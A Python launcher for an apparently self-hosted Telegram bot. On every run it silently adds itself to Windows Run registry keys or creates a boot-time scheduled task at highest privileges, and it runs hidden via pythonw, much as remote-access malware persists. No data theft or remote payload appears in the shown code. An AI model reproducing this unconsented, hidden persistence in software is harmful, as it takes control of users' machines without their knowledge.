import sys
import os
import asyncio
from pathlib import Path


def check_bot_token():
    """Проверяем наличие токена бота"""
    try:
        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
        from app.database import db
        
        if os.path.exists("database.db"):
            db_token = db.get_bot_token()
            if db_token:
                return True
    except:
        pass
    return True  # Разрешаем запуск для настройки токена


def setup_autostart():
    """Настройка автозапуска (после входа)"""
    try:
        import winreg
        import os
        
        # Используем путь к файлу скрипта, а не текущую директорию
        script_path = os.path.abspath(__file__)
        
        # Находим pythonw.exe более надёжным способом
        # Сначала пробуем найти pythonw.exe в той же директории, где находится python
        python_dir = os.path.dirname(sys.executable)
        pythonw_exe = os.path.join(python_dir, 'pythonw.exe')
        
        if os.path.exists(pythonw_exe):
            python_exe = pythonw_exe
        elif sys.executable.endswith('python.exe'):
            python_exe = sys.executable[:-10] + 'pythonw.exe'
        else:
            # Пробуем найти в PATH
            import shutil
            pythonw_path = shutil.which('pythonw.exe')
            if pythonw_path:
                python_exe = pythonw_path
            else:
                # Используем python.exe как запасной вариант
                python_exe = sys.executable
        
        # Используем pythonw.exe для скрытого запуска
        autostart_command = f'"{python_exe}" "{script_path}"'
        
        # Пробуем системный реестр
        try:
            key = winreg.HKEY_LOCAL_MACHINE
            subkey = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as reg_key:
                winreg.SetValueEx(reg_key, "TelegramBot", 0, winreg.REG_SZ, autostart_command)
            print("Автозапуск настроен (системный)")
            return True
        except PermissionError:
            pass
            
        # Пробуем пользовательский
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as reg_key:
                winreg.SetValueEx(reg_key, "TelegramBot", 0, winreg.REG_SZ, autostart_command)
            print("Автозапуск настроен (пользовательский)")
            return True
        except:
            pass
            
    except Exception as e:
        print(f"Не удалось настроить автозапуск: {e}")
    
    return False


def setup_autostart_before_login():
    """Настройка автозапуска ДО входа (через планировщик задач)"""
    try:
        import subprocess
        import os
        
        # Используем путь к файлу скрипта, а не текущую директорию
        script_path = os.path.abspath(__file__)
        
        # Находим pythonw.exe более надёжным способом
        # Сначала пробуем найти pythonw.exe в той же директории, где находится python
        python_dir = os.path.dirname(sys.executable)
        pythonw_exe = os.path.join(python_dir, 'pythonw.exe')
        
        if os.path.exists(pythonw_exe):
            python_exe = pythonw_exe
        elif sys.executable.endswith('python.exe'):
            python_exe = sys.executable[:-10] + 'pythonw.exe'
        else:
            # Пробуем найти в PATH
            import shutil
            pythonw_path = shutil.which('pythonw.exe')
            if pythonw_path:
                python_exe = pythonw_path
            else:
                # Используем python.exe как запасной вариант
                python_exe = sys.executable
        
        print(f"Используем: {python_exe}")
        
        # Удаляем старую задачу если есть
        subprocess.run(
            'schtasks /delete /tn "TelegramBot" /f',
            shell=True,
            capture_output=True
        )
        
        # Создаем новую задачу - запуск при загрузке системы
        # /RL HIGHEST - запуск с наивысшими привилегиями
        task_command = f'"{python_exe}" "{script_path}"'
        result = subprocess.run(
            f'schtasks /create /tn "TelegramBot" /tr "{task_command}" /sc ONSTART /rl HIGHEST /f',
            shell=True,
            capture_output=True,
            text=True
        )
        
        if result.returncode == 0:
            print("Автозапуск до входа настроен (планировщик)")
            return True
        else:
            print(f"Ошибка настройки: {result.stderr}")
            
    except Exception as e:
        print(f"Не удалось настроить автозапуск: {e}")
    
    return False


def remove_autostart():
    """Удаление автозапуска"""
    try:
        import winreg
        
        # Удаляем из реестра
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as reg_key:
                winreg.DeleteValue(reg_key, "TelegramBot")
            print("Автозапуск удален из реестра")
        except:
            pass
        
        # Удаляем из планировщика
        import subprocess
        subprocess.run(
            'schtasks /delete /tn "TelegramBot" /f',
            shell=True,
            capture_output=True
        )
        print("Автозапуск удален")
        
    except Exception as e:
        print(f"Ошибка удаления автозапуска: {e}")


def setup_scheduled_wakeup(hour: int, minute: int = 0):
    """
    Настройка пробуждения компьютера в определённое время
    
    Args:
        hour: час (0-23)
        minute: минуты (0-59)
    
    Важно: Для работы этой функции нужно:
    1. Включить " пробуждение от таймера" в BIOS/UEFI
    2. В Windows: powercfg /deviceenablewake "имя_устройства"
    """
    try:
        import subprocess
        import os
        
        # Используем путь к файлу скрипта, а не текущую директорию
        script_path = os.path.abspath(__file__)
        
        # Находим pythonw.exe более надёжным способом
        # Сначала пробуем найти pythonw.exe в той же директории, где находится python
        python_dir = os.path.dirname(sys.executable)
        pythonw_exe = os.path.join(python_dir, 'pythonw.exe')
        
        if os.path.exists(pythonw_exe):
            python_exe = pythonw_exe
        elif sys.executable.endswith('python.exe'):
            python_exe = sys.executable[:-10] + 'pythonw.exe'
        else:
            # Пробуем найти в PATH
            import shutil
            pythonw_path = shutil.which('pythonw.exe')
            if pythonw_path:
                python_exe = pythonw_path
            else:
                # Используем python.exe как запасной вариант
                python_exe = sys.executable
        
        # Форматируем время
        time_str = f"{hour:02d}:{minute:02d}"
        
        # Удаляем старую задачу
        subprocess.run(
            'schtasks /delete /tn "TelegramBotWake" /f',
            shell=True,
            capture_output=True
        )
        
        # Создаём задачу с пробуждением
        # /sc DAILY - каждый день
        # /st время запуска
        # /wi - запускать независимо от того, вошёл ли пользователь
        task_command = f'"{python_exe}" "{script_path}"'
        result = subprocess.run(
            f'schtasks /create /tn "TelegramBotWake" /tr "{task_command}" /sc DAILY /st {time_str} /rl HIGHEST /f',
            shell=True,
            capture_output=True,
            text=True
        )
        
        if result.returncode == 0:
            # Пробуем включить пробуждение от таймера
            wakeup_result = subprocess.run(
                'schtasks /change /tn "TelegramBotWake" /wakeup',
                shell=True,
                capture_output=True,
                text=True
            )
            print(f"Будильник настроен на {time_str}")
            return True
        else:
            print(f"Ошибка настройки будильника: {result.stderr}")
            return False
            
    except Exception as e:
        print(f"Не удалось настроить будильник: {e}")
    
    return False


def remove_scheduled_wakeup():
    """Удаление будильника"""
    try:
        import subprocess
        subprocess.run(
            'schtasks /delete /tn "TelegramBotWake" /f',
            shell=True,
            capture_output=True
        )
        print("Будильник удалён")
    except Exception as e:
        print(f"Ошибка удаления будильника: {e}")


def setup_environment():
    """Настройка окружения"""
    project_root = Path(__file__).parent
    sys.path.insert(0, str(project_root))
    os.makedirs('assets/backups', exist_ok=True)
    os.makedirs('assets/plugins', exist_ok=True)


async def main_async():
    """Основная асинхронная функция"""
    try:
        from app.bot import start_bot
        await start_bot()
    except KeyboardInterrupt:
        print("\nОстановка бота...")
    except Exception as e:
        print(f"Критическая ошибка: {e}")


def main():
    print('Starting bot...')
    setup_environment()
    
    # Проверяем, запущен ли от админа
    import ctypes
    is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    
    if is_admin:
        # Автозапуск до входа (требует админ права)
        setup_autostart_before_login()
        print("Запуск от админа - автозапуск до входа настроен")
    else:
        # Обычный запуск - автозапуск после входа
        setup_autostart()
        print("Обычный запуск - автозапуск после входа")
    
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        print("\nПрограмма завершена")
    except Exception as e:
        print(f"Ошибка запуска: {e}")


if __name__ == "__main__":
    main()
